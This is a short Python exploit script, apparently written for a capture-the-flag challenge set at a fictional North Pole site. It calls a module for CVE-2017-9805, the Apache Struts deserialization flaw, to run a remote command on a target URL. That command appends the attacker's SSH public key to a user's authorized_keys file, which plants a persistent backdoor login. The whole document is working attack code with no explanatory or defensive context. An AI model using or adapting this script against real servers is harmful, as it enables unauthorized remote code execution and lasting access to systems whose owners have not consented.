
import os
import cve_2017_9805

file_dir = os.path.dirname(os.path.realpath(__file__))
pub_key = open(os.path.join(file_dir, 'id_rsa.pub')).read().strip()

command = 'echo "{}" >> /home/alabaster_snowball/.ssh/authorized_keys'.format(pub_key)

print("Adding public ssh key to authorized_keys:\n{}".format(pub_key))
cve_2017_9805.main("https://dev.northpolechristmastown.com/orders.xhtml", command)
